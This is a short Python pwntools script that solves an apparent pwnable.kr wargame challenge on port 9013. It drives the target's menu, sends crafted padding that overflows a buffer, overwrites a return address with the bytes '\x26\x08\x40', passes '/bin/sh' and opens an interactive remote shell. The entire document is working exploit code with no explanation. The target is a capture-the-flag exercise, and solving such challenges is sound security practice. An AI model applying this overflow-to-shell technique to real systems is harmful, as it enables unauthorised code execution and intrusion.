from pwn import *

def talk(wait, send):
	log = p.recvuntil(wait)
	log += send
	p.sendline(send)
	print log

p = remote('pwnable.kr', 9013)

talk('> ', '2')
talk(' : ', '0' * ((1028 - 16*1 - 2*8 - 1) - 4) + '111') # 64bit - pointer is 8 bytes

talk('> ', '3')
talk('(y/n)', 'a' * 1016 + '\x26\x08\x40')

talk('> ', '2')
talk(' : ', '/bin/sh')

p.interactive()
